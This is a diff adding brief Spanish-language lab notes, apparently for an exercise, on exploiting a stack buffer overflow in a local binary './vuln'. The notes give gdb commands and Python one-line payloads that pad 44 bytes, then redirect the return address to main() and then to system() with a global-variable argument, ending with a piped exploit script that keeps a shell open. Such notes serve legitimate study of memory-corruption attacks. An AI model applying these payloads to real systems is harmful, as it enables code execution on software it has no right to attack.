@@ -1,0 +1,32 @@
+gdb:
+display/16xw $sp
+
+run <<< $(python3 -c "print('A'*44)")
+
+run <<< $(python3 -c "print('A'*44 + 'B'*4)")
+
+run <<< $(python3 -c "print('A'*44 + 'Ò')")
+
+
+direcciones:
+
+main() : 0x080491d2
+=> little endian : d2910408
+=>Ò
+python3 -c "import sys; sys.stdout.buffer.write(b'A'*44 +b'\xd2\x91\x04\x08');"|./vuln
+
+
+system() : 0x08049208
+=> little endian : 08920408
+python3 -c "import sys; sys.stdout.buffer.write(b'A'*44 +b'\x08\x92\x04\x08');"|./vuln
+=> segfault porque no lo hemos pasado argumentos
+
+global : 0x0804c040
+=> little endian : 40c00408
+python3 -c "import sys; sys.stdout.buffer.write(b'A'*44 +b'\x08\x92\x04\x08'+ b'\x40\xc0\x04\x08');"|./vuln
+
+python3 -c "import sys; sys.stdout.buffer.write(b'ps\x00' + b'A'*41 + b'\x08\x92\x04\x08'+ b'\x40\xc0\x04\x08');"|./vuln
+
+(python3 exploit_sc.py; cat) | ./vuln
+
+REDIRECTION: line 2190 of man bash
